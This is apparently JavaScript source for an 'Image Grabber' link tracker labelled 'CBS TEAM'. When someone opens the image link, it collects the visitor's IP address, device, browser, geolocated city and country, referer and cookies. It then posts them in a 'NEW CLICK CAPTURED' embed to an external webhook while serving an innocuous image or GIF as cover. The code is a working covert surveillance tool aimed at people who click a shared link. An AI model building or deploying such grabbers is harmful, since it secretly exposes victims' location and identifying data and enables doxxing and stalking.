// Add this import at the top of your index.js file
const axios = require('axios');
const geoip = require('geoip-lite');

// Update the img/:id route in your index.js file:
app.get('/img/:id', async (req, res) => {
  const id = req.params.id;
  const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  
  // Enhanced data collection
  const userAgent = req.headers['user-agent'];
  let device = 'Desconhecido', browser = 'Desconhecido', os = 'Desconhecido';
  
  // Parse OS from User-Agent
  if (userAgent) {
    if (userAgent.includes('Windows')) os = 'Windows';
    else if (userAgent.includes('Mac')) os = 'MacOS';
    else if (userAgent.includes('Linux')) os = 'Linux';
    else if (userAgent.includes('Android')) os = 'Android';
    else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';
    
    // Parse browser from User-Agent
    if (userAgent.includes('Chrome')) browser = 'Chrome';
    else if (userAgent.includes('Firefox')) browser = 'Firefox';
    else if (userAgent.includes('Safari')) browser = 'Safari';
    else if (userAgent.includes('Edge')) browser = 'Edge';
    else if (userAgent.includes('Opera')) browser = 'Opera';
    
    // Detect device type
    if (userAgent.includes('Mobile')) device = 'Celular';
    else if (userAgent.includes('Tablet')) device = 'Tablet';
    else device = 'Computador';
  }
  
  // Get additional info from IP geolocation
  const geo = geoip.lookup(userIP);
  const country = geo ? geo.country : 'Desconhecido';
  const city = geo ? geo.city : 'Desconhecido';
  
  // Get timezone from browser
  const timezone = req.headers['accept-language'] || 'Desconhecido';
  
  // Additional metadata from request
  const timestamp = new Date().toISOString();
  const referer = req.headers['referer'] || 'Desconhecido';
  const cookie = req.headers['cookie'] || 'Sem cookies';
  
  // Create comprehensive data object
  const comprehensiveData = {
    ip: userIP,
    device: `${device} (${os})`,
    browser: browser,
    userAgent: userAgent,
    timestamp: timestamp,
    timezone: timezone,
    referer: referer,
    cookie: cookie,
    country: country,
    city: city,
    screenResolution: req.headers['x-screen-resolution'] || 'Desconhecido',
    language: req.headers['accept-language'] || 'Desconhecido',
    cookies: cookie.split(';').map(c => c.trim()),
    isBot: userAgent.includes('bot') || userAgent.includes('spider'),
    userAgentParsed: parseUserAgent(userAgent)
  };
  
  // Store data for later retrieval
  ipData[id] = comprehensiveData;
  
  // Send webhook with all data
  await enviarWebhook(id);
  
  // Send the image or fallback
  let imagemPath = path.join(__dirname, 'public', 'imagem.jpg');
  if (!fs.existsSync(imagemPath)) imagemPath = path.join(__dirname, 'public', 'imagem.png');
  if (fs.existsSync(imagemPath)) {
    res.sendFile(imagemPath);
  } else {
    res.send(`
      <!DOCTYPE html>
      <html>
      <head><title>CBS TEAM</title></head>
      <body style="margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;">
        <img src="https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif" style="max-width:90%;max-height:90%;border-radius:10px;">
      </body>
      </html>
    `);
  }
});

// Helper function to parse user agent details
function parseUserAgent(userAgent) {
  const result = {};
  if (userAgent.includes('Windows NT')) {
    const winVersion = userAgent.match(/Windows NT (\d+\.\d+)/)?.[1] || 'Desconhecido';
    result.windowsVersion = winVersion;
  }
  if (userAgent.includes('macOS')) {
    const macVersion = userAgent.match(/macOS (\d+\.\d+)/)?.[1] || 'Desconhecido';
    result.macVersion = macVersion;
  }
  if (userAgent.includes('Android')) {
    const androidVersion = userAgent.match(/Android (\d+\.\d+)/)?.[1] || 'Desconhecido';
    result.androidVersion = androidVersion;
  }
  if (userAgent.includes('iPhone OS')) {
    const iosVersion = userAgent.match(/iPhone OS (\d+_\d+)/)?.[1]?.replace('_', '.') || 'Desconhecido';
    result.iosVersion = iosVersion;
  }
  return result;
}

// Update the webhook sending function to include all data:
async function enviarWebhook(id) {
  const data = ipData[id];
  if (!data) return;
  
  // Extract key data for webhook
  const embed = {
    title: '📸 NOVO CLIQUE CAPTURADO!',
    color: 0xFF0000,
    fields: [
      { name: '🌐 IP', value: data.ip || 'Desconhecido', inline: true },
      { name: '💻 Dispositivo', value: data.device || 'Desconhecido', inline: true },
      { name: '🌍 Navegador', value: data.browser || 'Desconhecido', inline: true },
      { name: '📱 User-Agent', value: data.userAgent || 'Desconhecido', inline: false },
      { name: '🕐 Horário', value: data.timestamp || 'Desconhecido', inline: true },
      { name: '🆔 ID', value: `\`${id}\``, inline: true },
      { name: '🌍 País', value: data.country || 'Desconhecido', inline: true },
      { name: '🏙️ Cidade', value: data.city || 'Desconhecido', inline: true },
      { name: '⏰ Timezone', value: data.timezone || 'Desconhecido', inline: true },
      { name: '🌐 Referer', value: data.referer || 'Desconhecido', inline: false },
      { name: '📱 Resolução', value: data.screenResolution || 'Desconhecido', inline: true },
      { name: '🌐 Idioma', value: data.language || 'Desconhecido', inline: true }
    ],
    footer: { text: 'CBS TEAM - Image Grabber' },
    timestamp: new Date()
  };
  
  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (e) {}
}